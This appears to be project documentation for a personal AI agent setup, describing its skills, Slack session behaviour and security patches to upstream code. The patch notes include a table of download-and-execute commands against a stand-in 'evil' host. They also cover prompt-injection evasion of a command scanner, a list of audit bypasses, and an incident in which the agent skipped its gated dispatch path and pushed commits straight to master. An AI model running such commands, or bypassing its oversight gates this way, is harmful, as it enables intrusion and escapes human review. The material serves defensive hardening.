The skill is **personal-orientation, never team-facing** — read-only across every system **except Jira**, where it creates/updates/comments/transitions Johannes's own tickets on his behalf (Team=Prometheus auto-stamped, no agent attribution — a delegated personal action, not posting for the team). It never sends Teams messages, posts Outlook mail, creates Confluence pages, opens GitLab MRs, or speaks for / pings teammates. Team-facing assistance (Greenkeeper / standup automation) is a separate Hermes Agent (not yet deployed). The skill's SKILL.md owns: identity model (`/m365/team` `members[]` + `repos[]`), MR↔Jira link via `jiraKeys`, structured "is MR blocked" check (5 conditions), and the recurring-question playbook ("what's on my plate", "what needs my review", "is X blocked", "Confluence context for Y").

**What's wired into briefings vs ad-hoc-only.** The morning briefing surfaces exactly three work signals: (1) today's Outlook calendar (merged with personal calendar under `:office:` prefix in the schedule section), (2) Jira sprint commitments — `:briefcase: Work — Sprint & Reviews`, (3) GitLab MRs needing action (ready-to-merge + needs-review, also in the Work section). The evening report keeps only tomorrow's merged calendar (wind-down tone forbids pressure-piling). **Everything else on the work surface is ad-hoc-only** — `/m365/important` (curated Teams alerts), `/m365/chats` + `/teams/.../channels/.../messages`, `/atlassian/confluence/*`, `/gitlab/events/recent`, `/gitlab/.../commits + releases` — never wired into briefings, never into the watchdog (watchdog is personal apps + infra alerts only). Errors: `503 M365 not authenticated …` → tell the user to run `bun m365:auth:prod` from `~/SourceRoot/argo`. `503` on `/gitlab/*` or `/atlassian/*` → corresponding PAT expired.

**Split: garmin-health vs strength.** Garmin Health owns passive measurements (`/daily-metrics`, `/recovery`, `/training-load`, `/fitness-direction`, `/activities`, `/weight-log`, `/user-profile`). Strength owns active lifting (`/workouts`, `/workout-sets`, `/exercises`) plus the 13-endpoint `/workouts/summary/*` analytics suite (e1RM, INOL, ACWR per-exercise, MEV/MAV/MRV landmarks, deload-signal, readiness). The cross-skill bridge is `/workouts/summary/readiness` — it joins Garmin recovery + strength fatigue debt and lives in `strength`. Note `weight-log` + `user-profile` are tagged Garmin Health in the live OpenAPI even though they're physically distinct from daily metrics; respect that grouping in cross-references.

**API secret:** `op://common/api/SECRET` (account `tkrumm`) — wired in `.env.tpl`.

**WalkingPad + Usage Tracking (newly surfaced, ad-hoc only).** Two recently-added Argo domains are now in `argo-api`: **WalkingPad** (`/walking-pad/*` — treadmill sessions, streak, pace; `references/walking-pad.md`; read-only — the device ingests sessions) answers "how far did I walk"; **Usage Tracking** (`/usage/*` — AI token/cost KPIs across all sources) answers "what have I spent on AI". Both are **ad-hoc only** — never wired into briefings or the watchdog (consistent with the watchdog-personal-only + briefing-work-scope rules). `/hermes/*` (Hermes Chat) and `/ai/v1/*` (AI Gateway) are infra Hermes never calls — see the argo-api taxonomy.

## Research (research-gateway)

Deep cited research is served by the standalone **research-gateway** (`research.jkrumm.com`,
VPS, **Tailscale-only** — the Mac Mini reaches it; same grey-cloud DNS pattern as the
audio-gateway). Hermes consumes it through the **`research-gateway` skill** (`skills/research-gateway/SKILL.md`)
via the `terminal` tool: submit `POST /research/ {query, depth?}` → `{jobId}`, then poll
`GET /research/{jobId}` until `status: done` → `{result: {report, citations[], sources[]}}`.
Async submit+poll because deep research outlasts a single sync call — even `quick` depth runs
1–3 min. It is the **preferred path for substantive / factual / library-version questions** (the
`research-first` discipline), over Hermes's built-in Tavily web search, which stays for quick
single lookups. Runs on EU/IU models, off Max.

- **Auth:** `RESEARCH_API_KEY` = `op://vps/research-gateway/API_SECRET` (the gateway's own
  bearer, shared with the Claude Code `/research` skill). Wired in `.env.tpl` (resolved at
  startup by `secrets.command`). Base URL hardcoded in the skill (like argo / karakeep).
- **tirith + cron allowlists extended:** both `patches/tirith-hermes-guards.patch` and
  `patches/cronjob-tools-allowlist-argo-bearer.patch` now include `research.jkrumm.com` in their
  trusted-host sets, so `curl https://research.jkrumm.com/... | jq` doesn't trip the
  pipe-to-interpreter / exfil gates (see *Local Modifications*).
- **Routing guard (SOUL.md):** "research X now" → `research-gateway` skill; "remind me to
  research X later" → `capture` → TickTick; book / novel discovery → `reading`.
- **Name collision (why `research-gateway`, not `research`):** upstream ships a bundled skill
  *category* directory `~/.hermes/skills/research/` (containing `arxiv`, `blogwatcher`,
  `llm-wiki`, `polymarket`, `research-paper-writing`). A top-level `research` symlink would
  collide with that dir (and `make setup` would back the whole category up, only for `hermes
  update` to re-seed and reconflict). So our skill is named `research-gateway` and symlinks to
  `~/.hermes/skills/research-gateway` — no collision, no reconciliation step needed. Routing is
  by description/tags, so natural-language "recherchier mal" still triggers it.

## Second Brain (Obsidian + KaraKeep)

Two skills make Hermes the front door to Johannes's second brain. Roles are deliberately distinct (don't blur them):

- **`obsidian`** — the **source of truth**: read/search/write the PARA vault at `~/SourceRoot/brain/`. The vault is also a **git repo**, shared with Claude Code (`/brain` skill) — a LaunchAgent pulls and pushes it every 5 minutes between the mini and the MacBook (on this Mac Mini it never auto-commits, so a write isn't durable until it's committed), and git is the deliberate review + history gate (`git diff` before a write to `wiki/` or the curated surface counts as done). The retired standalone OKF brain repo is folded into this vault. Shared machine-facing contract for both agents: `~/SourceRoot/brain/AGENTS.md`. **CLI-first** (`/usr/local/bin/obsidian` → `obsidian-cli`; Obsidian.app runs on this Mac Mini, so the CLI goes through Obsidian's live API — metadata cache, backlinks, Dataview), with a **filesystem fallback** when Obsidian isn't running. No secret. Encodes the *real* vault conventions (actual folders `Inbox`/`Projects`/`Areas`/`wiki`, `YYYY-MM-DD` naming, `#topic/subtopic` tags, per-type frontmatter) plus the two-layer split validated by `node .scripts/vault-lint.mjs`: agentic knowledge in the top-level `wiki/` tree (atomic English concept notes carrying `type`+`description`, strict), and the curated human surface `Projects`/`Areas` (Area/Project folder notes + human pages, any language, light — they link *down* into `wiki/`; no PARA `Resources` tier — reference material is a `wiki/` note or an Area page).
- **`karakeep`** — the **read-later / everything bucket**: REST against `https://karakeep.jkrumm.com/api/v1` (Bearer `$KARAKEEP_API_KEY` → `op://hermes/karakeep/api-key`, Tailscale-only). Save links/text, full-text search (Meili — no semantic search in 0.32.0), lists incl. smart lists, tags, highlights. AI auto-tagging is async (DeepSeek-V4-Flash via IU). State cache (`skills/karakeep/state.json`, gitignored, seeded by `make setup`) holds lists+tags, refresh-on-miss.

**Routing model** (the `capture` skill is the router): KaraKeep = reference/reading you consume · Obsidian = durable knowledge you author · TickTick = human action · GitHub = code change.

**Bundled-skill collision (obsidian).** Upstream ships a stock bundled `obsidian` skill (generic, filesystem-first) listed in `.bundled_manifest`. Our local `obsidian` (symlinked from this repo) has the same name; the stock one was removed from `~/.hermes/skills/note-taking/obsidian/` so ours is canonical. It **re-seeds on `hermes update`** — `/hermes-update` carries the `rm -rf ~/.hermes/skills/note-taking/obsidian` reconciliation step. In `hermes skills list` ours may show source `builtin` (name is in the manifest) — cosmetic; an empty *category* column confirms the top-level symlink (ours) is loaded.

**Kobo / e-reader (planned, Phase 4).** Reading selected vault notes on the Kobo via KOReader will use **Readeck** (single Go binary; `iceyear/readeck.koplugin` does bidirectional highlight + progress sync; OPDS at `/opds`) as a dedicated reading surface — *not* KaraKeep (its koplugin is save-only) and *not* Wallabag (no highlight sync-back). Hermes will push curated Obsidian/KaraKeep content into Readeck and pull highlights back to Obsidian. Not built yet.

## Local Modifications to Upstream

Re-apply after `hermes update`: **eight `.patch` files** (each applied with `git apply --3way`; `/hermes-update` carries the loop). All eight are regenerated against the current upstream baseline (**v0.19.1**, upstream `0a62610f`) so they re-apply cleanly on minor upstream bumps; only a structural rewrite of a touched function needs a hand-rewrite.

> **Retired patch — `auxiliary-client-gpt5-max-completion-tokens` (dropped at v0.15.1).** It forced `max_completion_tokens` for `gpt-5*`/`gpt-4o`/`o-series` models by name in `_build_call_kwargs`. v0.15.1 rewrote that function to **omit `max_tokens` entirely** for non-Anthropic custom endpoints (it only sets it for Anthropic-compat endpoints, where it's mandatory) — so the patch's target block no longer exists, and its defensive goal (never send `max_tokens` to a gpt-5 aux on the IU endpoint → HTTP 503) is now achieved by upstream's omit-by-default behavior. The direct-OpenAI `max_completion_tokens` case is handled by upstream's separate `auxiliary_max_tokens_param` helper. The current config (DeepSeek-V4-Flash auxiliaries, `chat_completions`) never hit this path regardless. Patch file deleted from `patches/`.

> **Retired patch — `slack-audio-mime-ext` (dropped at v0.18.2).** It mapped a Slack audio file's MIME type to the correct download extension (`audio/mp4` → `.m4a` etc.), since upstream's `ext = "." + mimetype.split("/")[-1]` produced unmapped extensions that got force-defaulted to `.ogg` — corrupting the bytes/extension pairing the STT endpoint expected. v0.18.2's platform-plugin rewrite (see below) introduced upstream's **own** `_resolve_slack_audio_ext()` helper (`plugins/platforms/slack/adapter.py`) that does the same job more thoroughly: real filename extension first, then a `_SLACK_AUDIO_MIME_TO_EXT` mimetype map, falling back to `.m4a` (not `.ogg`) as a last resort — plus a companion `_is_slack_voice_clip()` check that reroutes Slack's `video/mp4`-mislabeled in-app voice clips onto the audio path. Our patch's target is fully superseded. Patch file deleted from `patches/`.

> **Retired hunk — `_resolve_thread_ts` synthetic-thread guard (dropped at v0.19.0, with the switch to threads).** It detected a synthetic `thread_id == reply_to` (no real `thread_ts`) and returned `None` so the reply posted flat in the channel. Two independent reasons it went: (1) it was **already dead code** — upstream's own `if not reply_in_thread:` branch (`adapter.py:3174-3180`) *returns unconditionally* before ever reaching it, and it was functionally equivalent anyway (outbound metadata is built by `_thread_metadata_for_source` in `gateway/platforms/base.py`, which sets only `thread_id`, never `thread_ts`, so the guard's extra `not real_thread_ts` condition was always true). CLAUDE.md previously claimed the guard "targets the `if metadata:` branch that upstream still lacks" and that "our config uses `reply_in_thread: true`" — **both were wrong**; the key had been `false` since `1e753e9`. (2) Once `reply_in_thread: true` (v0.19.0, see the threading note below) the guard becomes *actively harmful*: upstream's gate no longer returns early, so the guard fires on every top-level message → flat replies **and** a fresh context window per message, the worst of both. The other three hunks of `slack-cannot-reply-to-message.patch` (SlackApiError import, `cannot_reply_to_message` retry, mrkdwn normalization) are unaffected and stay.

> **Slack threading = context-window boundary (changed at v0.19.0).** `slack.reply_in_thread` is now **`true`** (upstream's default — every read site is `.get("reply_in_thread", True)`; the key is absent from `DEFAULT_CONFIG`, so the code default governs). This is not cosmetic: `build_session_key()` (`gateway/session.py:1029`, key assembly at `1114-1131`) appends `thread_ts` to the session key **only when `source.thread_id` is set**, and the inbound scoping block (`adapter.py:5607-5638`) sets `thread_id` to the message's own ts for top-level messages *only* when `reply_in_thread` is true. So: **one Slack thread == one session == one context window.** Under the previous `false`, every top-level channel message collapsed into a single never-resetting session (`agent:main:slack:group:<team>:<C…>:<U…>`) — observed live at 213 messages over 6 days — while a real thread reply got an isolated window, with no visual cue which one you were in. Consequence of the flip: continuing a topic means replying **inside** its thread; a new top-level message is deliberately a clean slate. `session_reset.mode` is unset (default `none`), so only the compressor bounds a long-lived thread. Note `group_sessions_per_user` only affects the *flat* key shape — `isolate_user` is forced off whenever a thread is present (`session.py:1126-1129`).

> **Platform architecture rewrite (v0.18.x).** Upstream moved built-in chat platforms out of `gateway/platforms/` into a plugin system: Slack now lives at `plugins/platforms/slack/adapter.py` (previously `gateway/platforms/slack.py`, which no longer exists). `gateway/platforms/base.py` (the shared response-delivery base class) stayed in place. All Slack-targeting patches below were rewritten against the new `adapter.py` path and file structure during the v0.16.0 → v0.18.2 update.

- **STT tool itself is stock upstream** — `tools/transcription_tools.py` (native `openai` STT) is unpatched, pointed at the **audio-gateway** (`audio-gateway.jkrumm.com`, tailnet-only) purely via `config.yaml` (`stt.openai`). Repointed off the retired Mac audio-proxy (`:7716`) when the audio stack consolidated onto the gateway. The Slack *download* path that feeds STT is now handled natively by upstream's `_resolve_slack_audio_ext()` (see the retirement note above) — no patch needed. The old localai-helper client patches (`tts_fast_tool.py`) and the `toolsets-expose-text-to-speech-fast` patch were removed when Hermes moved to Gemini Charon.
- `~/.hermes/hermes-agent/tools/tts_tool.py` — one small local modification on top of the stock native tool: name the saved audio file from the gateway's `X-Audio-Title` response header (a short title generated by the gateway's `DeepSeek-V4-Pro` prep step) instead of the upstream `tts_<timestamp>.mp3`, so the Slack attachment shows a real name. Source: `patches/tts-tool-audio-title.patch`. Re-apply: `cd ~/.hermes/hermes-agent && git apply ~/SourceRoot/hermes-agent/patches/tts-tool-audio-title.patch`. The patch (a) switches `_generate_openai_tts` to `with_raw_response` so it can read the header alongside the binary body and returns the decoded title, and (b) renames the output file to a sanitized title via a new `_rename_with_title` helper. TTS provider/voice/base_url stay config-driven (`tts.openai` → the **audio-gateway** at `audio-gateway.jkrumm.com`, repointed off the retired audio-proxy `:7716`). Without it, voice memos still work but land as `tts_<timestamp>.mp3` in Slack. The title itself is produced in the **audio-gateway** repo (`src/gemini-tts.ts`, `X-Audio-Title` header). **v0.18.2 nuance:** `_resolve_openai_audio_client_config()` independently grew a third `is_managed` return value upstream (routes to a managed OpenAI audio gateway); the patch's `_unquote` import (for decoding the title header) and the 3-tuple unpack now coexist — both are load-bearing, keep both on re-apply. **v0.19.1 nuance (conflicted, hand-resolved):** upstream grew `_generate_openai_tts` an `instructions: Optional[str]` parameter (voice-design guidance, forwarded to `audio.speech.create` only when truthy) and a `tts.openai.language` → `extra_body={"lang_code": …}` passthrough, and re-declared the return as `-> str` returning `output_path`. Resolution keeps **all three** upstream additions plus our raw-response title read, with the return staying `Optional[str]` (the title) — so the `openai` branch of the dispatcher now reads `audio_title = _generate_openai_tts(text, file_str, tts_config, instructions=instructions)`. The DeepInfra caller still discards the value, so the title return remains harmless there.
- `~/.hermes/hermes-agent/plugins/platforms/slack/adapter.py` (moved from `gateway/platforms/slack.py` at v0.18.x — see the platform rewrite note above) — three changes, all in `patches/slack-cannot-reply-to-message.patch`. Re-apply: `cd ~/.hermes/hermes-agent && git apply ~/SourceRoot/hermes-agent/patches/slack-cannot-reply-to-message.patch`.
  - `format_message()` pre-steps: normalize `*` list markers to `-`, strip backticks from inline code containing emoji shortcodes. **Not upstream.**
  - ~~`_resolve_thread_ts` synthetic-thread guard~~ — **retired at v0.19.0**, see the retirement note below.
  - `send()` retry: on `cannot_reply_to_message`, drop `thread_ts` and retry chunk as plain channel message. **Not upstream.**
- `~/.hermes/hermes-agent/gateway/platforms/base.py` — pass the text reply's anchor (`_reply_anchor_for_event(event)`) to the media senders (`send_voice`/`send_video`/`send_document`) in the response media-dispatch loops, so attached files thread identically to the text reply. Source: `patches/slack-media-inline-reply-anchor.patch`. Re-apply: `cd ~/.hermes/hermes-agent && git apply ~/SourceRoot/hermes-agent/patches/slack-media-inline-reply-anchor.patch`. **Dormant since v0.19.0's switch to `reply_in_thread: true`:** with threads on, `_resolve_thread_ts` returns the same `thread_id` whether or not `reply_to` is passed, so media and text land together either way. Kept applied — it costs nothing, keeps the text and media paths symmetric, and is immediately load-bearing again if `reply_in_thread` ever goes back to `false`. Under `false` it *was* load-bearing: the media senders got `reply_to=None`, so the flat-reply guard (which only nulls the message's own ts when it equals `reply_to`) couldn't fire, and TTS audio landed in a thread while the text reply sat inline. Real threads always threaded correctly (anchor ≠ thread parent). **v0.18.2 nuance:** upstream independently wraps this metadata in `_mark_notify_metadata()` (renamed to `_final_thread_metadata`) for the same call sites — the patch's `reply_to=_media_reply_anchor` addition and upstream's `_final_thread_metadata` variable now coexist; keep both on re-apply. **v0.19.1 nuance (conflicted, hand-resolved):** upstream added an `if _non_image_media: logger.info("Delivering %d non-image MEDIA attachment(s)")` block at the exact line the patch inserts `_media_reply_anchor` — independent additions, keep both (log block first, then the anchor assignment).
- `~/.hermes/hermes-agent/cron/scheduler.py` — skip `resolve_channel_name` for raw Slack channel IDs in `_resolve_single_delivery_target`. Source: `patches/scheduler-skip-resolver-for-slack-ids.patch`. Re-apply: `cd ~/.hermes/hermes-agent && git apply ~/SourceRoot/hermes-agent/patches/scheduler-skip-resolver-for-slack-ids.patch`. Without this, `--deliver slack:<C…ID>` fails with `channel_not_found` for any channel that has exactly one thread session in the directory (prefix-match collision against compound `C…:thread_ts` entries).
- `~/.hermes/hermes-agent/run_agent.py` — broaden `_try_refresh_anthropic_client_credentials` skip-condition from Azure-only to all third-party Anthropic-compatible endpoints. Source: `patches/run-agent-third-party-endpoint-token-refresh.patch`. Re-apply: `cd ~/.hermes/hermes-agent && git apply ~/SourceRoot/hermes-agent/patches/run-agent-third-party-endpoint-token-refresh.patch`. The bug it fixes: `resolve_anthropic_token()` prefers the `~/.claude/.credentials.json` OAuth token over `ANTHROPIC_API_KEY`, swapping the client's IU key for an OAuth token, so the next request 401s on the IU endpoint with "Authorization parsing failed" / "invalid x-api-key". Upstream (still, at v0.19.1) only excludes `azure.com`; the patch swaps that literal for `_is_third_party_anthropic_endpoint(base_url)`, which covers all non-`anthropic.com` hosts. **Currently dormant — unreachable twice over** (audited 2026-07-24): the function returns at its first guard because `self.api_mode != "anthropic_messages"` (live config is `chat_completions` for both `model` and `fallback_providers`), and again at `self.provider != "anthropic"` (live provider is `custom`). It was genuinely load-bearing until `0e17b0d` (2026-05-21), when the brain moved off `provider: anthropic` + `base_url: ${ANTHROPIC_BASE_URL}`; it becomes load-bearing again the moment a model is routed back through the IU `/anthropic` endpoint on the native Anthropic provider. Kept applied — same defensive posture as `auxiliary-client-anthropic-mode-respect`, zero cost on the `chat_completions` path.
- `~/.hermes/hermes-agent/tools/tirith_security.py` — early-return `allow` in `check_command_security` when the command is a trusted-personal-API pipeline (every URL on `argo.jkrumm.com`, `karakeep.jkrumm.com`, or `research.jkrumm.com`, every pipeline-stage program in a safe text-tool set, no shell escape hatches). Source: `patches/tirith-hermes-guards.patch` (renamed at v0.19.0 when the download-guard rule joined it — repo convention is one patch per source file, since regeneration is `git diff HEAD -- <file>`). Re-apply: `cd ~/.hermes/hermes-agent && git apply ~/SourceRoot/hermes-agent/patches/tirith-hermes-guards.patch`. Without this, tirith's `[HIGH] Pipe to interpreter` rule fires on **every** `curl https://argo.jkrumm.com/... | python3 ...` (and `| jq` to a lesser degree) the LLM produces — Hermes constantly stops at a Slack approval gate ("Command Approval Required") for completely safe argo calls that pipe JSON to python3 for formatting. The threat tirith protects against ("Downloaded content will be executed without inspection") doesn't apply: argo is bearer-authenticated and serves JSON parsed as data, not executable code. Patch mirrors the cron-scanner allowlist precedent — only the allowlisted hosts (`argo.jkrumm.com`, `karakeep.jkrumm.com`, `research.jkrumm.com`, via the `_ALLOWED_PIPELINE_HOSTS` frozenset) + a small safe-program set (curl, jq, python3, head, tail, tee, tr, cat, wc, cut, grep, sort, awk, sed, uniq, xargs) are accepted, and any redirect, `$(...)`, backtick, `;`, `&&`, `||`, `&`, `(`, `>` token defers to tirith. Sanity-tested against 19 representative shapes (8 allow, 11 defer including mixed-host, eval, subshell, `sh -c`, redirect). **v0.18.2 nuance:** upstream independently added a circuit breaker (`_circuit_open`, after `_CRASH_LIMIT` consecutive tirith spawn/execution failures) as its own early-return at the same insertion point; the patch's argo-pipeline bypass now sits directly after it — both are independent early-return gates, order doesn't affect correctness.

  **Second rule in the same patch (added v0.19.0): `download_then_execute` block.** tirith blocks `curl URL | sh` (`curl_pipe_shell`, MITRE T1059.004) but **not** the trivially equivalent two-step form. Verified against the tirith binary directly (`~/.hermes/bin/tirith check --json --non-interactive --shell posix -- '<cmd>'`), so this is upstream tirith's ruleset gap, independent of any local patch:

  | Command | tirith verdict |
  |-|-|
  | `curl -s https://evil/x \| sh` | **block** `curl_pipe_shell` |
  | `curl -s https://evil/x > /tmp/f && sh /tmp/f` | allow |
  | `curl -s https://evil/x -o /tmp/f; bash /tmp/f` | allow |
  | `wget -qO /tmp/f https://evil/x && chmod +x /tmp/f && /tmp/f` | allow |

  Hermes hands the terminal tool to an LLM, so a prompt-injected instruction only has to pick the two-step spelling to walk past the one rule that exists. `_download_then_execute_reason()` rejects the shape before tirith is consulted, and is deliberately placed **before both the circuit breaker and the argo allowlist** — so it still holds when tirith is unavailable (note `tirith_fail_open` defaults **True**) and cannot be bypassed via an allowlisted host. (It *is* below the `tirith_enabled` gate — turning tirith off turns this off too, which is the intended reading of that switch.) It's a `block`, not a `warn`: this agent has no legitimate reason to fetch a file and execute it.

  It fires when a path written by a downloader is later executed, sourced, `chmod +x`'d, fed to an interpreter on stdin, or expanded via `$(cat …)`; when an interpreter gets an inline `$(curl …)`/`<(curl …)`; or when a downloaded file reaches a bare interpreter through a pipe. Write-detection is **per-program** because the flags disagree — `curl -o PATH` / `-O`→basename(URL); `wget -O PATH` (its `-o` is a *logfile*) / no `-O`→basename(URL) — plus glued (`-qO/tmp/f`), split (`-qO /tmp/f`), `--output=`, and `>`/`>>` in both spaced and glued (`>/tmp/f`) form. Taint follows one `cp`/`mv`/`install` hop.

  **Hardened 2026-07-24 after an adversarial audit** found 11 bypasses in the first implementation, including the `wget -qO /tmp/f` row of the table above — which this file previously claimed was blocked and was not. Regression suite: **`tests/test_download_guard.py`** (run with `~/.hermes/hermes-agent/venv/bin/python3`), currently 20/20 attack shapes blocked, 27/27 real Hermes commands allowed, 4000-input fuzz clean. Root causes worth remembering: newlines weren't segment separators (a multi-line command block is the *most* common LLM spelling), glued `>/tmp/f` didn't tokenize as a redirect, `-qO PATH` with the path in the next token was unhandled, and `os.path.normpath` preserves a leading `//` so `//tmp//f` ≠ `/tmp/f`. **Edits to `tirith_security.py` need a gateway restart** — the module is imported once at startup, so a green in-process test says nothing about the running process.

  **Known limits — deliberate; this raises the cost of the shape, it does not eliminate the class.** Not caught: cross-call (download in one terminal call, execute in the next — per-command scanning fundamentally cannot see this); value indirection where the written and executed spellings differ (`F=/tmp/f; curl -o $F URL; sh /tmp/f` — matching spellings *are* caught); `xargs`-mediated execution where the path arrives on stdin; arbitrary decode/transformer chains beyond the single `| sh` stdin case. **Not reported upstream to tirith yet** — worth doing.

  **Third rule in the same patch (added 2026-08-02): `raw_repo_write` block.** The `raw_agent_invocation` rule above stops Hermes composing its own `claude -p`. It does not stop Hermes skipping the episode entirely and editing the repo itself — and that is what happened, in the same session that built the `merge` verb. Asked in Slack to fix a README "implement tier", Hermes read the repo, saw the branches two earlier *dispatched* episodes had left, said in as many words **"I'll put the fix on master directly"**, edited the file with the terminal tool, committed, hit a push rejection because the remote had moved, fetched, rebased, and pushed. Nine turns, no `hermes-cc.sh`, no audit line, and the change landed on `origin/master` (`f7c16d6` in `dispatch-scratch`). Tier ceilings, worktree isolation, never-push-to-a-default-branch, the draft-PR gate, the merge checks and three daily budgets were all simply not involved. Same lesson as the `claude -p` incident, one layer down.

  `_repo_write_reason()` blocks it. **Unconditional, not path-scoped, and that is forced:** `git commit -m x` names no path — the repo comes from the terminal tool's working directory, which is invisible to a command scanner — so a path-scoped rule is evaded by `cd`, which is literally what happened. It is a **denylist of git write verbs** (commit, push, merge, rebase, reset, checkout, add, tag, clone, `config`, …), so every inspection (`log`, `status`, `diff`, `show`, `blame`, `rev-parse`, `for-each-ref`, `fetch`) still works untouched — the agent reads repos exactly as before. `git -C <path>`, `sh -c "…"`, `ssh host "…"` and the wrapper set are all followed. Also blocked: `gh` subcommands that change code or its delivery (`pr create/merge/ready`, `release`, `repo create/delete/edit`, `workflow run`, `secret set`, `gh api` with a mutating method), and the same shapes by hand against `api.github.com`.

  **Two exemptions, both load-bearing, both tested.** (1) **Issues are not repo writes** — `gh issue create` is the `capture` skill's sanctioned path, `claude-dispatch` routes to it by name, and the `author` tier files one ungated; an issue changes nothing that runs. The `/issues` API path is exempt for the same reason (note GitHub serves PR *comments* from that path too — also fine). (2) **The brain vault**, `~/SourceRoot/brain`: the `obsidian` skill requires a commit for durability ("a write isn't durable until it's committed") **and** the vault is in the dispatch policy's `deny` list, so the guard's premise — "there is a bounded path instead" — is false there; refusing would tell the agent to dispatch into a repo that refuses dispatches. The exemption is narrow: the command must **name** the vault (`git -C ~/SourceRoot/brain …`, or a `cd` to it in the same command line). A bare `git commit` stays blocked, because a bare `git commit` is exactly the shape that landed on `dispatch-scratch`'s master. The obsidian skill was updated to spell the path. An explicit `-C` outside the vault always beats an earlier `cd` into it.

  Regression suite: **`tests/test_repo_write_guard.py`** — 62/62 attack shapes blocked, 51/51 real Hermes commands allowed, 4000-input fuzz clean. Two false positives found and fixed while writing it, both the "annoying guard" failure mode: `gh pr list --search add` tripped because flag *values* were being read as subcommands (now only the immediate subcommand is checked), and `git branch --list --contains HEAD` tripped because `HEAD` looked like a branch name to create (flags that take a value are now tracked). **Known limits:** cross-call `cd` (fails closed — the commit is refused, so the cost is naming the vault, not a bypass); editing files without git (not durable, not outward-facing, and `git status` shows it); value indirection (`G=git; $G push`). **Edits need a gateway restart** — the module is imported once at startup. **Verified live end-to-end 2026-08-02:** the same request that bypassed the bridge an hour earlier produced `verb=help` → `verb=dispatch mode=opened tier=implement` → `verb=status` → `verb=merge mode=merged`, PR #4 merged to `master` as `bab460a6`, with the repo untouched by any raw git.
- `~/.hermes/hermes-agent/tools/cronjob_tools.py` — extend the shared `_strip_cron_safe_constructs` helper with an argo + karakeep + research allowlist so the cron-prompt scanners stop flagging legitimate `curl -H "Authorization: Bearer $HOMELAB_API_KEY" "https://argo.jkrumm.com/..."` shapes (and the `$KARAKEEP_API_KEY` → `https://karakeep.jkrumm.com/...` and `$RESEARCH_API_KEY` → `https://research.jkrumm.com/...` equivalents) carried by the bundled argo + karakeep + research-gateway skills. Source: `patches/cronjob-tools-allowlist-argo-bearer.patch`. Re-apply: `cd ~/.hermes/hermes-agent && git apply ~/SourceRoot/hermes-agent/patches/cronjob-tools-allowlist-argo-bearer.patch`. **v0.15.1 refactor:** upstream split the cron scanner into `_scan_cron_prompt` (raw user prompt — still checks `_CRON_EXFIL_COMMAND_PATTERNS`, incl. `exfil_curl_auth_header`) and `_scan_cron_skill_assembled` (skills-loaded — now uses a looser pattern set that already *drops* the curl/exfil shapes), with the GitHub-auth exemption hoisted into a shared `_strip_cron_safe_constructs` helper both call. The argo allowlist now lives in that **shared helper** (was inline in `_scan_cron_prompt`), so it covers both paths: the still-live `exfil_curl_auth_header` block on the raw-prompt path, plus harmless redundancy on the assembled path. Without it, any cron whose raw prompt carries an argo bearer curl fails with `Blocked: prompt matches threat pattern 'exfil_curl_auth_header'`. The patch sanitizes allowlisted-host markdown bash fences plus any single-line argo/karakeep curl before the exfil scan runs, but leaves any fence containing a non-allowlisted host intact so real exfil to a different host still triggers. Co-located evil curls in the same fence as argo/karakeep curls still get caught because the fence-sanitizer skips fences with a foreign host alongside the allowlisted ones. (Behaviorally tested post-update: argo single-line + fence sanitized, evil single-line + mixed fence preserved, GitHub fallback intact.) **v0.19.1 nuance (conflicted, hand-resolved):** upstream rewrote *its own half* of the helper — the GitHub strip went from `re.search` + a single `str.replace` (first occurrence only) to a repeated `re.sub` with a tighter host anchor (`api.github.com` must be followed by `/`, whitespace, quote or end, so `api.github.com.evil.com` no longer counts) and a `[^\s;&|$\`]*` path tail that can't swallow a smuggled `;`/`&&`/`$(…)`. Resolution keeps **upstream's** version of the GitHub strip verbatim and appends our argo/karakeep/research block, operating on its result. Differential-tested against a pristine v0.19.1 worktree afterwards: argo + karakeep + research curls and the argo fence pass live and are **blocked** in pristine (patch still load-bearing), evil-host and mixed-fence curls blocked in both, GitHub fallback — including two occurrences in one prompt — passes in both.
- `~/.hermes/hermes-agent/agent/auxiliary_client.py` — respect `api_mode: anthropic_messages` in the `provider == "custom" + explicit_base_url` branch of `resolve_provider_client`: skip the `/anthropic`→`/v1` rewrite that `_to_openai_base_url` would otherwise apply, so `custom_base` keeps the `/anthropic` suffix. Source: `patches/auxiliary-client-anthropic-mode-respect.patch`. Re-apply: `cd ~/.hermes/hermes-agent && git apply ~/SourceRoot/hermes-agent/patches/auxiliary-client-anthropic-mode-respect.patch`. **v0.15.1 nuance:** upstream's `_maybe_wrap_anthropic` now detects the Anthropic surface via `api_mode == "anthropic_messages"` *explicitly* (decoupled from the URL suffix), so detection itself no longer breaks — **but** the patch is still load-bearing because `build_anthropic_client(api_key, base_url)` is handed `custom_base`; if that got rewritten to `/v1` the Anthropic client targets `/v1/messages` on the IU `/anthropic`-only gateway → 404 "Endpoint not found". The patch keeps the correct `/anthropic` base. **Currently defensive/dormant:** the live config routes the brain *and* auxiliaries through `${OPENAI_BASE_URL}` with `api_mode: chat_completions` (DeepSeek-V4-Pro / -Flash), so the `anthropic_messages` branch isn't exercised today — the patch only matters if a model is re-routed through the IU `/anthropic` endpoint. Kept applied (clean, zero cost on the `chat_completions` path).

## Setup

```bash
make setup        # idempotent — symlinks, cron, CC skills
make status       # verify everything is in place (incl. audio-gateway remote health)
```

Prerequisites:
1. `hermes` CLI installed (see README.md §2)
2. `audio-gateway` reachable at `https://audio-gateway.jkrumm.com/health` (VPS Docker container over the tailnet) — for TTS/STT
3. 1Password CLI authenticated as `tkrumm`

## Editing Rules

**Adding a Hermes skill:** create `skills/{name}/SKILL.md`, add `{name}` to
`HERMES_SKILLS` in the Makefile, run `make setup`. If the skill should appear in scheduled briefings, also wire it into the relevant cron prompt (`cron/*.prompt.txt`) and re-sync `cron/jobs.json`.

**Renaming or retiring one is the half that gets forgotten — and it fails silently.** A cron
job preloads skills *by name*; when a name no longer resolves, `cron/scheduler.py` logs
`skill not found, skipping` at **WARNING** and runs the job anyway, and `watchdog-poll.py`
matches `ERROR|CRITICAL` only. So the job keeps reporting `ok` while running with fewer
skills than it declares. That is exactly what the 2026-06 consolidation into
`argo-api/references/*.md` did: both briefings kept naming `tasks`, `schedule`, `weather`,
`infrastructure`, `slack`, `garmin-health`, `strength` — 7 of 8 dead — for weeks, logging 12
warnings a day. They only survived because every endpoint is also spelled out inline in the
prompt and `work` happened to carry the argo auth pattern. Fixed 2026-08-02: both jobs now
preload `argo-api` + `work`, and `make status` asserts **every skill named in
`~/.hermes/cron/jobs.json` resolves** (negative-tested — it prints `✗ cron skill "…" missing`).
